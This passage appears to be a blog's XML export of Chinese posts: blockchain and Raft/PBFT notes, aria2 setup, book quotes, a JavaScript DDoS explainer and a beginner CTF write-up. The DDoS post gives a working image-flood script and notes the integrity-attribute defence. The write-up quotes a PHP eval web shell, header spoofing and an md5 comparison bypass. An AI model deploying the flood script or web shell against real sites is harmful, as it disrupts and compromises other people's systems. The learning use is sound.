选举流程1234567RAFT的leader选举流程： 1）任何一个服务器都可以成为一个候选者candidate，它向其他服务器follower发出要求选举自己的请求。2）其他服务器同意了，发出OK。注意，如果在这个过程中，有一个follower宕机，没有收到请求选举的要求，此时候选者可以自己选自己，只要达到N/2+1的大多数票，候选人还是可以成为leader的。3）这样这个候选者就成为了leader领导人，它可以向选民也就是follower发出指令，比如进行记账。4）以后通过心跳进行记账的通知。5）一旦这个leader崩溃了，那么follower中有一个成为候选者，并发出邀票选举。6）follower同意后，其成为leader，继续承担记账等指导工作。 记账过程123456Raft的记账过程按以下步骤完成：1）假设leader领导人已经选出，这时客户端发出增加一个日志的要求；2）leader要求follower遵从他的指令，都将这个新的日志内容追加到他们各自日志中；3）大多数follower服务器将交易记录写入账本后，确认追加成功，发出确认成功信息；4）在下一个心跳中，leader会通知所有follower更新确认的项目。对于每个新的交易记录，重复上述过程 RAFT和PBFT对比一个团队一定会有一个老大和普通成员。对于raft算法，共识过程就是：只要老大还没挂，老大说什么，我们（团队普通成员）就做什么，坚决执行。那什么时候重新老大呢？只有当老大挂了才重选老大，不然生是老大的人，死是老大的鬼。 对于pbft算法，共识过程就是：老大向我发送命令时，当我认为老大的命令是有问题时，我会拒绝执行。就算我认为老大的命令是对的，我还会问下团队的其它成员老大的命令是否是对的，只有大多数人（2f+1）都认为老大的命令是对的时候，我才会去执行命令。那什么时候重选老大呢？老大挂了当然要重选，如果大多数人都认为老大不称职或者有问题时，我们也会重新选择老大。 1.raft算法从节点不会拒绝主节点的请求，而pbft算法从节点在某些情况下会拒绝主节点的请求 ; 2.raft算法只能容错故障节点，并且最大容错节点数为（n-1）/2，而pbft算法能容错故障节点和作恶节点，最大容错节点数为（n-1）/3。 区块链架构比特币区块链1.0区块链1.0是可编程货币，是与转账、汇款和数字化支付相关的密码学货币应用，目标是实现货币的去中心化与支付手段。比特币是区块链1.0最典型的代表, 区块链的发展催生了大量的货币交易平台，实现了货币的部分职能，能够实现货品交易。 比特币钱包： 移动钱包 桌面钱包 互联网钱包 纸钱包 优势 利于并行 可回溯 避免数据膨胀 缺点 查余额时必须回溯查询一大堆交易信息，浪费大量时间和资源 以太坊区块链2.0区块链2.0是可编程金融，是经济、市场和金融领域的区块链应用，核心理念是把区块链作为一个可编程的分布式信用基础设施，支撑智能合约应用，以与过去比特币区块链作为一个虚拟货币支撑平台区别开来。 以太坊：数字代币，基于智能合约 以太坊架构如上 比特币 以太坊 账户设计 无账户的概念，每个账户的余额都是从他们在区块链上的UTXO计算出来的 拥有外部账户和合约账户，外部账户为用户账户，由私钥控制。合约账户是一种可编程账户，受代码控制并由外部账户激活 区块链设计 采用Merkle树将交易的哈希值组成二叉树状结构，顶层节点的哈希值用来校验交易清单 采用Merkle Patricia树来实现对交易和状态的校验和查询。 计算和图灵完备 非图灵完备 图灵完备 EVM高级语言 不提供高级语言支持 提供Solidity、Serpent、LLL等高级语言让用户编写智能合约，高级语言会编译成在EVM中执行的EVM字节码 P2P网络 比特币P2P协议 创建引入RLPx与Whisper网络协议，RLPx协议主要功能是在节点间建立通信并维持通信；Whisper协议主要用于Dapp之间的通信。以太坊P2P网络实现了更多功能扩展 事件 无事件概念 以太坊中的事件是一个以太坊日志和事件监测的协议的抽象。日志的记录中提供合约的地址；事件利用现有的ABI功能来解析日志记录 共识机制 采用PoW机制，依靠的是CPU计算难度问题 对比特币PoW机制进行改进，加入内存难度，具有抵抗单凭哈希运算优化的ASIC挖矿机的属性，以太坊未来将采用PoS共识机制 以太坊客户端较为流行的是go-Ethereum和Parity 两种账户类型：外部持有账户（EOA）和合约账户（CA） 外部账号可以调用合约账户 以太坊中的世界状态定义为以太坊区块链中的全局状态，表示为以太坊地址和账户状态之间的映射。 u账户状态由4个字段组成: nonce：当每次从地址发送交易时，该值递增。在合约账户中，该值代表账户创建的合约数量。 balance:账户余额。ether也认为是以太币的单位，另一个常用的单位是wei。 storageroot：代表Merkle Patricia树的根节点,并对账户的存储内容进行编码。（合约账户） codehash:作为一个不可变字段,包含了与账户关联的智能合约代码的哈希值。在普通账户中,该字段包含一个空字符串的 Keccak 256位哈希值。另外,代码通过一个消息调用而被调用。 智能合约定义：广义的智能合约是一种安全的、处于运行状态的计算机程序 ，体现了一种自动执行以及强制执行的协议。 狭义上讲，智能合约就是存储在区块链上的代码，用以实现执行特定的功能；能根据预先任意制定的规则来自动转移数字资产的系统。 智能合约有以下属性 自动执行 强制执行 明确的语义 安全性和不可阻止性 ​ 智能合约实际上是采用某种语言编写的、计算机或目标可理解的计算机程序.此外，智能合约还包含了以业务逻辑形式出现的各方之间的协议.另一个核心理念是，当某些条件满足时，智能契约将自动执行.另外，强制性意味着所有的合约条款都是按照规定和预期执行的，对于攻击者而言同样如此. ​ 智能合约还具备安全性以及“不可阻挡”性，也就是说，计算机程序必须以这样一种方式设计：在合理的时间范围内具备容错能力并保持执行状态，即使外部因素处于不利状态下，相关程序也应能够执行和维护一个健康的内部状态. ​ 智能合约应该具备确定性.据此，网络上的任何节点运行同一个智能合约，并获得相同的结果.如果最终结果在节点之间略有不同，那么将无法达成共识，因此，区块链上分布式共识的整个范例可能会失效. 智能合约的优点： 高效的实时更新 准确执行 较低的人为干预风险 去中心化权威 较低的运行成本 智能合约的缺点： 漏洞无法修复 隐私保护风险 缺乏有效监管 无法完全实施 智能合约The DAO事件：DAO是最高的众筹项目之一，于2016年4月启动 DAO遭受攻击后，创建了硬分叉用于修复，但违背了去中心化的理念。 以太坊虚拟机以太坊虚拟机时以太网上智能合约的运行环境 特点有①高度脚本化的设计语言使得智能合约的开发更简单；②和以太坊区块链一样同时存储于各个节点计算机上；③简单式堆栈架构，可应用于256位的Keccak散列算法和椭圆曲线计算；④可处理异常执行，包括堆栈溢出和无效指令等；⑤图灵完备，支持任何种类的计算，代码执行受参数Gas的严格制约。 智能合约的使用步骤①编译合约===&gt;&gt;&gt;②创建合约===&gt;&gt;&gt;③部署合约===&gt;&gt;&gt;④调用合约===&gt;&gt;&gt;⑤监听合约||⑤销毁合约； 编译智能合约以太坊上的合约就是一段可以被虚拟机执行的代码，这些代码以以太坊特有的二进制的形式存储在区块链上，并由以太坊虚拟机解释，因此被称为以太坊虚拟机位码。目前，用于以太坊智能合约开发的语言主要由Solidity、Serpent、LLL。 Solidity作为最流行的智能合约语言， 以其简单易用和高可读性受到以太坊设计者们的推荐 创建智能合约创建合约，需要输入合约名称，合约版本号、合约创建者、合约的内容等 部署智能合约部署合约就是将编译好的合约字节码通过外部账户发送交易的形式部署到以太坊区块链上，部署合约时，需要支付费用，要确保账户里有足够的余额（可以创建自己独立的测试网络，即自己的区块链，初始化的时候就可以初始化一些有余额的账户）。部署合约的一般流程： ①输入命令，部署合约； ②查看交易池待处理状况，如有待确认的交易，查看交易内容； ③查看挖矿日志，检验交易是否已发送到以太坊区块链上； ④等待矿工确认，利用txpool.status命令查看交易池状态； ⑤利用eth.getblock命令查看区块中是否含有关于合约的交易。 调用智能合约智能合约的调用需要两个字段：和约地址（表明调用哪个合约）和合约abi(application binaryinterface)（表明具体用合约的哪个方法） 原因：首先，合约内容是可以完全重复的，所以我们根据合约名字、合约内容或者合约内容的哈希，去调用某一个合约都是可能重复的，只有合约地址是不会重复的。另外，合约内的函数名是可以重载的，就是说我们可以有多个叫setValue的函数，但是所需要的传入参数不同。EVM中使用了abi，便于调用，同时还能区分不同的函数。调用合约的一般流程： ①利用eth.contract来定义一个合约类，定义的合约类遵循ABI定义，构建合约实例 ②调用合约 监听智能合约合约部署后，可设置监听，既可以实时监控事件，也可以从历史区块中检索 event。 销毁智能合约合约也可以结束，当一个合约通过kill方法将其杀死，那么我们将不能再和这个合约进行交互，如果一个合约被销毁，那么当前地址指向的是一个僵尸对象，这个僵尸对象调用任何方法都会抛出异常。此时需要调用selfdestruct(address)才能将其进行销毁。 需要指出的是只有拥有者才能销毁合约。 应用场景数字身份智能合约可以允许个人拥有并且控制包含数据、信誉和数字资产在内的数字身份。它允许个人自己决定向对手公开的数据内容，更为企业提供无缝了解客户的机会。 交易对手将不能获取敏感数据来验证交易。这减少了责任，同时促进了解你的客户法规（KYC）要求的无摩擦化，还提高了合规性，可恢复性和互操作性。 记录智能合同可以将统一商业代码（Uniform Commercial Code，UCC）归档数字化，并且自动更新发布流程。他们还可以自动地完善贷款人的贷款担保物权。它们可以自动遵守在将来销毁所要求记录的规则。不仅如此，还能通过UCC留置权自动解锁，自动更新或自动请求抵押品。在执行此类功能时，智能合同能够降低法律成本。 证券智能合约可以简化资本构成表的管理。它们还绕开证券托管链中的中间人，并促进自动支付股息，股票分拆和负债管理，同时降低操作风险。智能合约能将分布式账本上证券的工作流程数字化。 贸易金融智能合约可以通过快速信用证和贸易支付开启来简化国际货物转移，同时获得更大的金融资产的流动性，提高买家，供应商和机构的融资效率。此外，政府必须确定在执行失败的情况下，特别是在纠纷和违约的情况下，法律应当如何界定责任。 对于贸易金融而言，结算系统、技术要求和离散生态系统的整合是重要的三元素。 供应链智能合约可以让供应链中的每一步变得实时可见。互联网设备可以将产品从工厂车间转移到商店货架之间的每个步骤都记录下来。它们促进粒度级别的库存跟踪，这有利于保护供应链的融资、保险和风险。这种增强的跟踪和验证技术降低了盗窃和欺诈的风险。如果想让智能合约实现大规模应用，供应链参与者必须证明其身份，包括公司，机构，个人，传感器，设施和产品等。 汽车保险智能合约可以改善目前混乱的汽车投保及赔付流程。智能合约可以记录相关政策、驾驶记录和驾驶员报告，允许互联网车辆在发生事故后立即执行索赔。合约能够自动处理索赔，验证和付款过程。每个投保人的存储库中都包括了驾驶记录，车辆和事故报告历史。消除重复的报告也会节省成本。不过，这些都需要跨行业协作来解决技术，监管和财务上的挑战。 P2Pp2p简介定义： 网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体。在此网络中的参与者既是资源（服务和内容）提供者（Server），又是资源获取者（Client）。 P2P网络原理从计算模式上来说，P2P打破了传统的Client/Server (C/S)模式，在网络中的每个结点的地位都是对等的。每个结点既充当服务器，为其他结点提供服务，同时也享用其他结点提供的服务。 P2P改变了目前互联网中占主导地位的客户/服务器结构中信息在消费者和生产者之间的不平衡。由于P2P网络没有中心节点（中心服务器），网络中的每个节点具有信息消费者和信息提供者的双重身份P2P，同时具有信息通信方面的功能，因此P2P应用的实现扩展性强，实现方式灵活多样，部署成本低，给互联网的发布和共享带来了巨大的空间。 P2P特点 P2P是动态的：动态地提供信息和服务 P2P是双向的：切实实现信息和服务的交换与共享 P2P是直接的：无中介、等级和格式限制，直接交换信息和服务 P2P是平等的：生产者与消费者地位平等，角色合二为一 P2P是及时的：无服务器参与空间分配，可提供实时、可升级的信息 P2P是有效的：可充分利用个人计算机的硬件设备、传输信息和服务时目标确定 P2P优势 非中心化 网络中的资源和服务分散在所有节点上，信息传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈。 可扩展性 在P2P网络中，节点在获取其他节点资源的同时也为其他节点服务。随着用户的加入，不仅服务的需求增加了，系统整体的资源和服务能力也在同步扩充，始终能较便捷地满足用户的需求。 健壮性 P2P网络通常都是以自组织的方式建立起来的，并允许节点自由地加入和离开。由于服务是分散在各个节点之间进行的，当部分节点或网络遭到破坏时，对其他部分的影响很小。 高性价比 采用P2P架构可以有效地利用互联网中散步的大量普通节点，将计算任务或存储资料分布到所有节点上，利用其中空置的计算能力或存储空间达到高性能计算和海量存储的目的。 隐私保护 在P2P中，所有参与者可以提供中继转发的功能，因此大大提高了匿名通信的灵活性和可靠性，能够为用户提供更好的隐私保护。 负载均衡 在P2P网络环境下由于每个节点既是服务器又是客户端，减少了对传统C/S结构中服务器计算能力、存储能力的要求，同时由于资源分布在多个节点，因此能更好地实现整个网络的负载均衡。 P2P加密 文件内容共享和下载，例如Napster、Gnutella、eDonkey等 计算能力和存储共享，例如SETI@home、Avaki等 基于P2P技术的协同与服务共享平台，例如JXTA等 即时通讯工具，包括ICQ、QQ、Yahoo Messenger等 P2P通讯与信息共享，例如Skype、Crowds、Onion Routing等； 基于P2P技术的网络电视：沸点、PPStream、 PPLive、 QQLive、 SopCast等。 拓扑结构拓扑结构是指分布式系统中各个计算单元之间的物理或逻辑的互联关系，结点之间的拓扑结构一直是确定系统类型的重要依据。 P2P网络的拓扑结构 根据结构关系可以将P2P系统细分为四种拓扑形式： 中心化拓扑（Centralized Topology） 全分布式非结构化拓扑（Decentralized Unstructured Topology） 全分布式结构化拓扑（Decentralized Structured Topology，也称作DHT网络） 半分布式拓扑（Partially Decentralized Topology） 中心化拓扑结构即存在一个中心节点保存了其他所有节点的索引信息，索引信息一般包括IP地址、端口、节点资源等。 Napster是最早出现的P2P系统之一，它的工作原理如图所示。当某个用户需要某个音乐文件时，首先连接到Napster中央索引服务器，在服务器上进行检索，服务器返回存有该文件的用户信息，再由请求者直接连到文件的所有者传输文件。Napster首先实现了文件查询与文件传输的分离，有效地节省了中央服务器的带宽消耗，减少了系统的文件传输延时。 优点 维护简单、资源发现效率高 缺点 中央索引服务器的瘫痪容易导致整个网络的崩溃，因此可靠性和安全性较低。 随着网络规模的扩大，对中央索引服务器进行维护和更新的费用将急剧增加，所需成本较高。 中央索引服务器的存在常引起版权问题上的纠纷，服务提供商容易被追究法律责任。]]></content>
      <categories>
        <category>BlockChain</category>
      </categories>
      <tags>
        <tag>StudyNote</tag>
        <tag>BlockChain</tag>
        <tag>bitcoin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DDoS-JavaScript]]></title>
    <url>%2F2019%2F12%2F12%2FDDoS-Javascript%2F</url>
    <content type="text"><![CDATA[关于JavaScript的DDoS攻击 引用： https://www.freebuf.com/news/66447.html 该攻击属于应用层攻击 Javascript实现DDos攻击原理分析 现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。 既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。 如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。 入侵共享JavaScript的第三方服务器 许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。 一段简单的JS代码就能发起DoS攻击 12345678910111213141516171819&lt;head&gt;&lt;script type='text/javascript'&gt;function imgflood()&#123; //var TARGET = 'victim-website.com' var TARGET = "127.0.0.1:12345" var URI = '/index?' var pic = new Image() var rand = Math.floor(Math.random()*1000) pic.src = 'http://'+TARGET+URI+'val='+rand //pic.src = 'http://'+TARGET+URI+'val='+rand&#125;setInterval(imgflood, 10)alert(pic.src)&lt;/script&gt;&lt;/head&gt;&lt;body&gt;f*********************king&lt;script type='text/javascript'&gt;imgflood()&lt;/script&gt;&lt;/body&gt; setInterval(code, millisec):以millisec 毫秒的间隔执行code 由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击 1&lt;script src="https://code.jquery.com/jquery-1.10.2.min.js"&gt; 预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本 123&lt;script src="https://code.jquery.com/jquery-1.10.2.min.js" integrity="sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg=" crossorigin="anonymous"&gt; 中间人攻击示意图：攻击其中的请求外部js的途径 在写js-DDoS的问题： HTML引入外部js脚本，放在head中不起作用,放在body中才起作用这是因为加载HTML文档时，先加载了js脚本后就不起作用了。一般引入外部css文件放在head中，引入外部js脚本放在body中。先渲染HTML文档(css)，再加载特效(js)]]></content>
      <categories>
        <category>DDoS</category>
      </categories>
      <tags>
        <tag>Network</tag>
        <tag>DDoS</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tricks]]></title>
    <url>%2F2019%2F12%2F01%2Ftricks%2F</url>
    <content type="text"><![CDATA[To record some strange tricksPython1.something about math.log如图，当math.log(125,5)时应该值为3的，但是出了一个bug 好奇心驱使我去写一个脚本看看，然后发现这些能hack math.log函数的不在少数 12345for i in range(2,101): for j in range(100): ij = i**j if math.log(ij, i) != j: print(i,'\t',j) 然后去ubuntu虚拟机尝试了python2，发现也有这个问题 看了官方文档，发现有底数的对数函数是通过换底公式实现的，统一换成以e为底的对数去计算，因此会有除法的溢出导致以上问题。 math.`log`(x[, base]) With one argument, return the natural logarithm of x (to base e). With two arguments, return the logarithm of x to the given base, calculated as log(x)/log(base). 1math.log(x[,base]) = log(x) / log(base) 哪怕是math.log(x**y,x)也会有这个问题。 最有力的证明：]]></content>
  </entry>
  <entry>
    <title><![CDATA[aria2]]></title>
    <url>%2F2019%2F11%2F27%2Faria2%2F</url>
    <content type="text"><![CDATA[Aria2 参考： aria2 aria2 manual github-aria2 Windows 下如何配置 Aria 2 AriaNg 强大的 Aria2 Web 端 安装及使用 webui配置： YAAW AriaNg 由于不想下载可爱的迅雷，于是搜索搜索就得到了这个下载工具——Aria2 这东西不仅可以当作下载器，而且可以支持各种协议，包括bt等等 安装步骤1.进入官方页面 Aria2，也可以去官方github的项目地址 https://github.com/aria2/aria2/releases/tag/release-1.35.0 下载release包，也可以下源码自己编译。 2.下载之后解压至目录下，然后再该目录下新建以下4个文件 Aria2.log：日志，空文件即可 aria2.session：下载历史，空文件即可 aria2.conf：配置文件 run.bat or run.vbs：用于自动启动或隐藏窗口，可选 Aria2.conf如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118## '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 #### 被注释的选项填写的是默认值, 建议在需要修改时再取消注释 #### 文件保存相关 ### 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置dir=aira2/downloads# 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M#disk-cache=32M# 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc# 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc# falloc和trunc则需要文件系统和内核支持# NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项#file-allocation=none# 断点续传continue=truelog=aria2/aria2.log## 下载连接相关 ### 最大同时下载任务数, 运行时可修改, 默认:5#max-concurrent-downloads=5# 同一服务器连接数, 添加时可指定, 默认:1max-connection-per-server=5# 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M# 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载min-split-size=10M# 单个任务最大线程数, 添加时可指定, 默认:5#split=5# 整体下载速度限制, 运行时可修改, 默认:0#max-overall-download-limit=0# 单个任务下载速度限制, 默认:0#max-download-limit=0# 整体上传速度限制, 运行时可修改, 默认:0#max-overall-upload-limit=0# 单个任务上传速度限制, 默认:0#max-upload-limit=0# 禁用IPv6, 默认:false#disable-ipv6=true# 连接超时时间, 默认:60#timeout=60# 最大重试次数, 设置为0表示不限制重试次数, 默认:5#max-tries=5# 设置重试等待的秒数, 默认:0#retry-wait=0## 进度保存相关 ### 从会话文件中读取下载任务input-file=aria2/aria2.session# 在Aria2退出时保存`错误/未完成`的下载任务到会话文件save-session=aria2/aria2.session# 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0#save-session-interval=60## RPC相关设置 ### 启用RPC, 默认:falseenable-rpc=true# 允许所有来源, 默认:falserpc-allow-origin-all=true# 允许非外部访问, 默认:falserpc-listen-all=true# 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同#event-poll=select# RPC监听端口, 端口被占用时可以修改, 默认:6800#rpc-listen-port=6800# 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项#rpc-secret=&lt;TOKEN&gt;# 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-user=&lt;USER&gt;# 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项#rpc-passwd=&lt;PASSWD&gt;# 是否启用 RPC 服务的 SSL/TLS 加密,# 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接#rpc-secure=true# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,# 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥#rpc-certificate=/path/to/certificate.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件#rpc-private-key=/path/to/certificate.key## BT/PT下载相关 ### 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true#follow-torrent=true# BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999listen-port=51413# 单个种子最大连接数, 默认:55#bt-max-peers=55# 打开DHT功能, PT需要禁用, 默认:trueenable-dht=false# 打开IPv6 DHT功能, PT需要禁用#enable-dht6=false# DHT网络监听端口, 默认:6881-6999#dht-listen-port=6881-6999# 本地节点查找, PT需要禁用, 默认:false#bt-enable-lpd=false# 种子交换, PT需要禁用, 默认:trueenable-peer-exchange=false# 每个种子限速, 对少种的PT很有用, 默认:50K#bt-request-peer-speed-limit=50K# 客户端伪装, PT需要peer-id-prefix=-TR2770-user-agent=Transmission/2.77peer-agent=Transmission/2.77# 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0seed-ratio=0# 强制保存会话, 即使任务已经完成, 默认:false# 较新的版本开启后会在任务完成后依然保留.aria2文件#force-save=false# BT校验相关, 默认:true#bt-hash-check-seed=true# 继续之前的BT任务时, 无需再次校验, 默认:falsebt-seed-unverified=true# 保存磁力链接元数据为种子文件(.torrent文件), 默认:falsebt-save-metadata=true 注意修改以下选项： dir=\path\to\Download\ （下载文件保存路径，改为你想要的） log=\path\to\Aria2\Aria2.log （日志文件，路径D:\App\Aria2\改为你安装aria2的路径） input-file=\path\to\Aria2\aria2.session save-session=\path\to\Aria2\aria2.session 以下是可以自动隐藏运行aria2的脚本 1CreateObject(&quot;WScript.Shell&quot;).Run &quot;D:\App\Aria2\aria2c.exe --conf-path=aria2.conf&quot;,0 3. 管理Aria 2 下载任务 首先我们要打开Aria2 的WebUI，即YAWW或者AriaNg 然后再页面的设置中将JSON-RPC Path设置为http://localhost:6800/jsonrpc 点保存，即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Le Petit Prince Note]]></title>
    <url>%2F2019%2F11%2F26%2FLe-Petit-Prince-Note%2F</url>
    <content type="text"><![CDATA[Le Petit Prince小王子 希望我能如小王子一样，被一朵玫瑰所驯化~ 希望我下次再读这本书时会有不一样的感受把。 我告诉你这么多有关B612号小行星的事情，让你知道它的编号，是因为大人。大人热爱数字。…… 如果有人爱上一朵花，天上的星星有亿万颗，而这朵花只长在其中一颗上，这足以让他再仰望夜空时感到很快乐。他会告诉自己：“在星空的某处有我的花。” 可惜从前我什么都不懂！我应该看着她的行动，而不是听她的言语！她为我散发芬芳，点亮我的生活。我不应该离开她的，我应该看出藏在她那些后面的柔情。花儿的心事好难捉摸的！当时我太小了，不懂得爱是什么。 “那你可以审判自己，”国王回答说，“这是最难的。审判自己比审判别人难得多。如果你能正确地审判自己，那你就是真正的聪明人”、 看东西只有用心才能看得清楚，重要的东西用眼睛看不见的。 正是你为你的玫瑰付出的时间，使得你的玫瑰是如此的重要。]]></content>
      <categories>
        <category>Reading</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SDUCTF2019-wp]]></title>
    <url>%2F2019%2F11%2F15%2FSDUCTF2019-wp%2F</url>
    <content type="text"><![CDATA[SDUCTF2019-WriteUp刚入门了ctf2周，便有新生赛玩，真好。 PS.刚准备写wp又放出来一题QAQ ！！！写wp一半又放出题目 说好的周六早上放题的，结果早上起来一脸懵逼 校园网下pwntools下到崩溃啊啊啊啊啊 Web0x01 最简答的Web题 题目描述：flag就在html里面，右键点击查看源代码即可查看 直接F12查看源码，找到flag 0x02 按钮点击 题目描述： 想方设法点击按钮 进入页面一个灰色的按钮，F12查看源码 删除button标签里的disabled即可点击按钮 1&lt;input style="width: 150px; height: 60px; font-size: 30px;" type="button" onclick="c()" value="flag" disabled=""&gt; 后面好奇，发现flag就在click2.js里，被base64加密过 0x03 量子波动速读 题目描述： 你会量子波动速读吗？ 进入页面就一个按钮，点击查看，发现一闪而过的fakeflag 123&lt;button onclick="window.location.href = 'flag_is_here.html'"&gt; 点击查看flag&lt;/button&gt; 源码如上，输入url/flag_is_here.html发现就是刚才一闪而过的页面 利用burpsuite抓包即可，因为所有请求被burpsuite拦截，所以可以看到/flag_is_here.html但是页面上给的是fake ctf，明显不是flag，查看源码得到flag，我是直接用repeater发一个包获得Response。 0x04 芝麻开门 题目描述： 简单的提交，芝麻开门 直接复制题目的zhimakaimen进去，返回的是口令错误 查看burpsuite拦截的包，好像是因为他的输入框有长度限制，所以少了一个字母 利用burpsuite的repeater重新发一个完整的包，得到flag 0x05 Funny Button 题目描述： 有趣的按钮，你能点到吗？ 即示例的题目，删除html的css或js都可以，甚至可以用tab键选中button按钮，点击去就是flag 0x06 曲奇 题目描述： 你喜欢吃曲奇饼干吗？ 曲奇==cookies，直接查看网站cookies即可 flag即在内容里，注意flag要进行url解码 0x07 GET 题目描述： 你就是个没有感情的浏览器 我是一个莫得感情的get机器 0x08 未来浏览器 题目描述： 小王正在追剧《亲爱的，热爱的》，电脑屏幕。。。。（谁帮我编个） 当他再次醒来。。。。。。。 有题目已知，用burpsuite改http头属性User-Agent即可 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36 改后发包得到flag 0x09 POST 题目描述： 你就是一个没有感情的浏览器 我只是一个莫得感情的post机器 利用firefox插件HackBar发送post请求，或者用burpsuite也行 0x0a vim好用啊 题目描述： 小明同学用vim编辑主页的时候，实验室断电了！ 由题目得知用vim时断电，用过vim的人都知道，当vim非正常退出时会创建一个保护的缓存文件，现在word也一样。 直接百度搜vim异常退出的备份文件，因为上次做过类似的，试试index.php.bak和index.php~没用，就百度了一下，得知备份文件格式为.index.php.swp，访问url/.index.php.swp下载文件得到.index.php.swp 得知flag在url/vimvimvimvim.php里，果然vim是最好的编辑器（狗头保命 0x0b 一句话木马 题目描述： 听说过一句话木马吗？ 听说过中国菜刀吗？ 听说过中国蚁剑吗？ 快去了解一下吧！！ 看刀&lt;!--php eval(@$_POST[&quot;cmd&quot;]);--&gt;就可知是一句话木马，对这个稍微了解一下，去github获取中国蚁剑即可 不过有一个坑，就是他默认访问是index.php，但是通过中国蚁剑连不上，回头看页面，发现在题目中有一个shell.php，于是尝试url/shell.php加上密码cmd，成功连上得到flag 0x0c 达拉崩吧 题目描述： 达拉崩吧打怪小游戏 进入页面是个小游戏，发现是hackergame2019原题嘤嘤嘤 原题wp： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md 在买菜这里，有一个大整数溢出，后续会搞懂这个原理 原理如下： https://blog.csdn.net/zhenghhgz/article/details/78657917 原意是javascript的所有数字，无论整数还是小数，类型都为Number，为64位浮点数。因此，JavaScript中所有的数都是浮点数。遵循IEEE 754标准（浮点数算术标准），JavaScript所能表示的数值范围为正负1.7976931348623157乘以10的308次方，其最小所能表示的小数为正负5乘以10的负324次方，这两个边界值可以分别通过访问Number对象的MAX_VALUE属性和MIN_VALUE属性来获取。 JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。值得注意的是，对于整数的位运算（比如移位等操作），JavaScript仅支持32位整型数，也即从-2147483648到+2147483647之间的整数。 然后得到flag 0x0d HTTP头 题目描述： 你了解http头吗？ 根据题目，直接查看http Response Headers 得到flag：F1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89} 0x0e robots 题目描述： 你听说过robots协议吗？他可是每个机器人都需要遵守的协议啊！（笑话） 由题目知，robots是一个限制爬虫的东西，直接访问url/robots.txt 123User-agent: *Disallow: /Disallow: f1ag_1s_h3re.php 得到如上页面，访问url/f1ag_1s_h3re.php，得到flag 0x0f 你的IP不太对 题目描述：小伙计，你的IP不太对啊这个网站可不是任何ip都能访问的 由题目可知，需要改ip成111.111.111.111访问，易知是XFF伪造 利用burpsuite抓包，在header里加上X-Forwarded-For:111.111.111.111即可，发送包，得到flag 0x10 登录 题目描述： 小王做了一个网站需要登录，但是验证貌似有点漏洞 进入页面之后发现button是没有用的，F5刷新之后抓包，发现有一个cookie 尝试将Cookie改成Cookie: Login=1，发现成功得到flag在button上 0x11 破解md5 题目描述： md5是坚不可破的，是真的吗？ 进入页面之后直接查看源码，如题直接百度搜索php MD5漏洞。 引自： https://blog.csdn.net/qq_19980431/article/details/83018232 123456789&lt;!-- if (isset($_GET['a']) and isset($_GET['b'])) &#123; if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.';&#125; --&gt; 